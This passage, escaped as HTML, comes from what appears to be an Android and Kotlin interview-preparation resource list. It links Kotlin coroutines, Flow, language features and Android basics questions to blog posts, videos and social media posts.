 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/coroutinescope-vs-supervisorscope"&gt;coroutineScope vs supervisorScope&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/suspend-function-in-kotlin-coroutines"&gt;suspend function in Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/kotlin-withcontext-vs-async-await"&gt;Kotlin withContext vs Async-await&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/coroutinecontext-in-kotlin"&gt;CoroutineContext in Kotlin&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/callback-to-coroutines-in-kotlin"&gt;Callback to Coroutines in Kotlin&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/retrofit-with-kotlin-coroutines"&gt;Retrofit with Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/parallel-multiple-network-calls-using-kotlin-coroutines"&gt;Parallel Multiple Network Calls Using Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/room-database-with-kotlin-coroutines"&gt;Room Database with Kotlin Coroutines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/unit-testing-viewmodel-with-kotlin-coroutines-and-livedata"&gt;Unit Testing ViewModel with Kotlin Coroutines and LiveData&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Kotlin Flow API&lt;/h3&gt; 
&lt;p&gt;Topics you should know in &lt;strong&gt;Kotlin Flow API&lt;/strong&gt; for Android Interview:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Flow Builder, Operator, Collector&lt;/li&gt; 
 &lt;li&gt;flowOn, dispatchers&lt;/li&gt; 
 &lt;li&gt;Operators such as filter, map, zip, flatMapConcat, retry, debounce, distinctUntilChanged, flatMapLatest&lt;/li&gt; 
 &lt;li&gt;Terminal operators&lt;/li&gt; 
 &lt;li&gt;Cold Flow vs Hot Flow&lt;/li&gt; 
 &lt;li&gt;StateFlow, SharedFlow, callbackFlow, channelFlow&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Learn the above-mentioned from the following links:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/flow-api-in-kotlin"&gt;Mastering Flow API in Kotlin&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/creating-flow-using-flow-builder-in-kotlin"&gt;Creating Flow Using Flow Builder in Kotlin&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/terminal-operators-in-kotlin-flow"&gt;Terminal Operators in Kotlin Flow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/cold-flow-vs-hot-flow"&gt;Cold Flow vs Hot Flow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/stateflow-and-sharedflow"&gt;StateFlow and SharedFlow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/long-running-tasks-in-parallel-with-kotlin-flow"&gt;Long-running tasks in parallel with Kotlin Flow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/retry-operator-in-kotlin-flow"&gt;Retry Operator in Kotlin Flow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/retrofit-with-kotlin-flow"&gt;Retrofit with Kotlin Flow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/room-database-with-kotlin-flow"&gt;Room Database with Kotlin Flow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/kotlin-flow-zip-operator-parallel-multiple-network-calls"&gt;Kotlin Flow Zip Operator for Parallel Multiple Network Calls&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/instant-search-using-kotlin-flow-operators"&gt;Instant Search Using Kotlin Flow Operators&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/callback-to-flow-api-in-kotlin"&gt;callbackFlow - Callback to Flow API in Kotlin&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/exception-handling-in-kotlin-flow"&gt;Exception Handling in Kotlin Flow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/unit-testing-viewmodel-with-kotlin-flow-and-stateflow"&gt;Unit Testing ViewModel with Kotlin Flow and StateFlow&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Kotlin&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;15 Kotlin Interview Questions and Answers&lt;/strong&gt;: &lt;a href="https://www.linkedin.com/posts/outcomeschool_kotlin-interview-questions-and-answers-activity-7276115620536954880-cFUa"&gt;Check the PDF&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the advantage of using const in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=3G49ivVxfkU"&gt;Video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/const-in-kotlin"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When to use lateinit keyword used in Kotlin?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/lateinit-vs-lazy-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is inline function in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=GLLI8h67ryo"&gt;Video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/inline-function-in-kotlin"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are &lt;code&gt;companion objects&lt;/code&gt; in Kotlin?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/companion-object-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Extension functions&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/extension-function-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a data class in Kotlin?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/data-class-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Remove duplicates from an array in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/remove-duplicates-from-an-array-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a JvmStatic Annotation in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=qBBbOhY_pv4"&gt;Video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/jvmstatic-annotation-in-kotlin"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a JvmField Annotation in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=bx8OZcMbeUE"&gt;Video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/jvmfield-annotation-in-kotlin"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a JvmOverloads Annotation in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=fHGsBV9Za8M"&gt;Video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/jvmoverloads-annotation-in-kotlin"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;noinline in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/noinline-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;crossinline in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/crossinline-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;scope functions in Kotlin&lt;/strong&gt; - &lt;a href="https://kotlinlang.org/docs/scope-functions.html"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a reified keyword in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=kD2T84FnTck"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;lateinit vs lazy in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/lateinit-vs-lazy-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is an &lt;code&gt;init&lt;/code&gt; block in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=cb3jOFozJns"&gt;Video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/init-block-in-kotlin"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between == and === in Kotlin&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=lJtgxT2OIgQ"&gt;Video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/structural-and-referential-equality-in-kotlin"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Advantage of using const in Kotlin&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=3G49ivVxfkU"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are higher-order functions in Kotlin?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/higher-order-functions-and-lambdas-in-kotlin"&gt;Higher-Order Functions and Lambdas in Kotlin&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Write a function(Higher-Order Function) that returns a function.&lt;/strong&gt; - &lt;a href="https://x.com/amitiitbhu/status/1862721662208155800"&gt;Check solution here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are Lambdas in Kotlin&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/higher-order-functions-and-lambdas-in-kotlin"&gt;Higher-Order Functions and Lambdas in Kotlin&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;AssociateBy - List to Map in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/associateby-list-to-map-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Open keyword in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/open-keyword-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Companion object in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/companion-object-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;internal visibility modifier in Kotlin&lt;/strong&gt; - &lt;a href="https://youtu.be/wOHpuf74-cI"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;partition - filtering function in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/partition-filtering-function-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Infix notation in Kotlin&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/infix-notation-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does the Kotlin Multiplatform work?&lt;/strong&gt; - &lt;a href="https://youtu.be/nwfNh6Kd5hI"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Suspending vs Blocking in Kotlin Coroutines&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=V2lL_aJp17I"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is runBlocking in Coroutines?&lt;/strong&gt; - &lt;a href="https://x.com/outcome_school/status/1861455930061156797"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the meaning of structured concurrency in Kotlin Coroutines?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7267476661967683584-wDCh/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;String vs StringBuffer vs StringBuilder&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/string-vs-stringbuffer-vs-stringbuilder"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between &lt;code&gt;val&lt;/code&gt; and &lt;code&gt;var&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/44200075/val-and-var-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to check if a &lt;code&gt;lateinit&lt;/code&gt; variable has been initialized?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/lateinit-vs-lazy-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to do lazy initialization of variables in Kotlin?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/lateinit-vs-lazy-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the visibility modifiers in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7371540850289336320-2zxw"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the equivalent of Java static methods in Kotlin?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/40352684/what-is-the-equivalent-of-java-static-methods-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to create a Singleton class in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7297112198252806144-97Eh"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between &lt;code&gt;open&lt;/code&gt; and &lt;code&gt;public&lt;/code&gt; in Kotlin?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/open-keyword-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;apply&lt;/code&gt; scope function and its use cases&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7302625113240154114-GNgz"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;let&lt;/code&gt; scope function and its use cases&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7297672603203223552-_9zp"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain the use-case of &lt;code&gt;let&lt;/code&gt;, &lt;code&gt;run&lt;/code&gt;, &lt;code&gt;with&lt;/code&gt;, &lt;code&gt;also&lt;/code&gt;, &lt;code&gt;apply&lt;/code&gt; in Kotlin.&lt;/strong&gt; - Learn from &lt;a href="https://kotlinlang.org/docs/scope-functions.html"&gt;here&lt;/a&gt; and &lt;a href="https://stackoverflow.com/questions/45977011/example-of-when-should-we-use-run-let-apply-also-and-with-on-kotlin"&gt;here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to choose between &lt;code&gt;apply&lt;/code&gt; and &lt;code&gt;with&lt;/code&gt;?&lt;/strong&gt; - Learn from &lt;a href="https://kotlinlang.org/docs/scope-functions.html"&gt;here&lt;/a&gt; and &lt;a href="https://stackoverflow.com/questions/45977011/example-of-when-should-we-use-run-let-apply-also-and-with-on-kotlin"&gt;here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between List and Array types in Kotlin&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/36262305/difference-between-list-and-array-types-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are &lt;code&gt;Labels&lt;/code&gt; in Kotlin?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7305796789159215105-oEUj"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are Coroutines in Kotlin?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/kotlin-coroutines"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Coroutine Scope?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/kotlin-coroutines"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Scopes in Kotlin Coroutines Used in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7278639980053217280-8eZO"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Coroutine Context?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/coroutinecontext-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Launch vs Async in Kotlin Coroutines&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/launch-vs-async-in-kotlin-coroutines"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Thread.sleep() vs delay() in Kotlin&lt;/strong&gt; - &lt;a href="https://x.com/amitiitbhu/status/1812806101944946962"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain inline classes in Kotlin&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineering-tech-activity-7251812269804724224-TR6Y"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Sealed Classes in Kotlin&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_sealed-classes-in-kotlin-activity-7311611732269887488-nKZI"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Sealed classes common use-cases in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7371392998867329024-5v9t"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tell about the Collections in Kotlin&lt;/strong&gt; - &lt;a href="https://kotlinlang.org/docs/collections-overview.html"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What does ?: do in Kotlin? (Elvis Operator)&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7269313270669295618-g6kJ"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;timeouts in Kotlin Coroutines&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7265684677770846208-Ug0Y"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you combine multiple coroutine results?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7267827335393873920-v6t3"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a Job in Coroutines?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_job-in-coroutines-activity-7372874272559656961-LIaI"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Coroutines job.cancel() vs scope.cancel()&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7321028335784894465-HCrl"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What happens if an exception is thrown inside an async coroutine, but await() is never called?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_kotlin-androiddev-activity-7353980436689145856-CTeE"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to Implement Debounce Using Coroutines?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7285163906686164994-tOUK"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Kotlin code snippet demonstrating how to run two coroutines in series and parallel&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7297944609614139392-h9NZ/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;yield in Kotlin Coroutines&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7298934394113638400-ZY-y"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Delegates in Kotlin&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7301107785302249474-WyDC"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;stateIn vs shareIn in Kotlin Flow&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_statein-vs-sharein-in-kotlin-flow-activity-7315963238318321664-BdYk"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;flatMapConcat, flatMapMerge, and flatMapLatest in Kotlin Flow&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7316049746022801409-OoTY"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;collect vs collectLatest in Kotlin Flow&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-kotlin-activity-7371769230389731328-UXPY"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Android&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;h4&gt;Base&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Why does an Android App lag?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/android-app-lag"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;Context&lt;/code&gt;? How is it used?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/context-in-android-application"&gt;Context In Android Application&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tell all the Android application components.&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7302543942028251137-S3vJ"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the project structure of an Android Application?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_android-app-project-structure-activity-7302902092812226560-bM8D"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;AndroidManifest.xml&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7305255303908888576-c0Nf"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the &lt;code&gt;Application&lt;/code&gt; class?&lt;/strong&gt; -&lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7304864185010528256-2GGU"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Activity and Fragment&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Why is it recommended to use only the default constructor to create a &lt;code&gt;Fragment&lt;/code&gt;?&lt;/strong&gt; - Learn from &lt;a href="https://www.youtube.com/watch?v=CitBt0FZFIc"&gt;video&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/default-constructor-to-create-a-fragment"&gt;blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;Activity&lt;/code&gt; and its lifecycle?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/activities/activity-lifecycle"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between onCreate() and onStart()&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/activities/activity-lifecycle"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
